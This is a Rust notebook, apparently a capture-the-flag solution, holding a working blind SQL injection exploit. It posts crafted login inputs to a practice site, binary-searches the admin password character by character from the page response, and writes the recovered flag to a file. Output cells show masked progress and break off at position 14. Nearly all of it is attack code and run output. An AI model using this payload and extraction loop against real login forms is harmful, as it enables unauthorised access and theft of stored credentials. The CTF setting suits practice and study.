In [3]:
:dep reqwest = { version = "0.12", features = ["json"] }
:dep tokio = { version = "1", features = ["full"] }

In [4]:
// :dep reqwest = { version = "0.12", features = ["json"] }
// :dep tokio = { version = "1", features = ["full"] }

use std::fs;
use std::time::Duration;

async fn check_le(
    client: &reqwest::Client,
    pos: usize,
    code: u8,
) -> Result<bool, reqwest::Error> {
    let payload = format!(
        "' or (SELECT unicode(substr(pass,{},1)) FROM user WHERE id='admin') <= {} --",
        pos, code
    );
    let params = [("id", payload.as_str()), ("pass", "")];
    let resp = client
        .post("https://ctfq.u1tramarine.blue/q6/")
        .form(&params)
        .send()
        .await?;
    let body = resp.text().await?;
    Ok(body.contains("Congratulations!"))
}

async fn check_le_with_retry(
    client: &reqwest::Client,
    pos: usize,
    code: u8,
    max_retries: u32,
) -> Option<bool> {
    for attempt in 0..max_retries {
        if attempt > 0 {
            let wait = Duration::from_secs(2u64.pow(attempt));
            eprintln!("[!] Retry {}/{} for pos={} code={}, waiting {}s...", attempt, max_retries, pos, code, wait.as_secs());
            tokio::time::sleep(wait).await;
        }
        match check_le(client, pos, code).await {
            Ok(result) => return Some(result),
            Err(e) => eprintln!("[!] Error pos={} code={}: {}", pos, code, e),
        }
    }
    None
}

async fn find_char(client: &reqwest::Client, pos: usize) -> Option<char> {
    let hi_code_init = 0x7eu8;

    match check_le_with_retry(client, pos, hi_code_init, 5).await {
        Some(false) | None => return None,
        _ => {}
    }
    tokio::time::sleep(Duration::from_millis(500)).await;

    let mut lo_code = 0x20u8;
    let mut hi_code = hi_code_init;

    while lo_code < hi_code {
        let mid = lo_code + (hi_code - lo_code) / 2;
        match check_le_with_retry(client, pos, mid, 5).await {
            Some(true)  => hi_code = mid,
            Some(false) => lo_code = mid + 1,
            None => {
                eprintln!("[!] Giving up on pos={}", pos);
                return None;
            }
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }

    Some(lo_code as char)
}

In [5]:
// ↑上のセルで関数定義、このセルで実行

let client = reqwest::Client::builder()
    .timeout(Duration::from_secs(60))
    .build()
    .expect("Failed to build HTTP client");

println!("[*] Waiting 5s before start...");
tokio::time::sleep(Duration::from_secs(5)).await;

let flag_len = 21usize;
let mut flag = String::new();
let mut flag_dummy = String::new();

for pos in 1..=flag_len {
    print!("[*] Finding char at position {}... ", pos);

    match find_char(&client, pos).await {
        Some(c) => {
            flag.push(c);
            if pos <= 5 {
                flag_dummy.push(c);
            } else {
                flag_dummy.push('*');
            }
            println!("position {} done -> progress: {}", pos, flag_dummy);
        }
        None => {
            println!("None (end of string or error)");
            break;
        }
    }

    tokio::time::sleep(Duration::from_millis(500)).await;
}

println!("\n[+] FLAG (masked): {}", flag_dummy);
fs::write("flag.txt", &flag).expect("Failed to write flag.txt");
println!("[+] FLAG written to flag.txt");

[*] Waiting 5s before start...
[*] Finding char at position 1... position 1 done -> progress: F
[*] Finding char at position 2... position 2 done -> progress: FL
[*] Finding char at position 3... position 3 done -> progress: FLA
[*] Finding char at position 4... position 4 done -> progress: FLAG
[*] Finding char at position 5... position 5 done -> progress: FLAG_
[*] Finding char at position 6... position 6 done -> progress: FLAG_*
[*] Finding char at position 7... position 7 done -> progress: FLAG_**
[*] Finding char at position 8... position 8 done -> progress: FLAG_***
[*] Finding char at position 9... position 9 done -> progress: FLAG_****
[*] Finding char at position 10... position 10 done -> progress: FLAG_*****
[*] Finding char at position 11... position 11 done -> progress: FLAG_******
[*] Finding char at position 12... position 12 done -> progress: FLAG_*******
[*] Finding char at position 13... position 13 done -> progress: FLAG_********
[*] Finding char at position 14... pos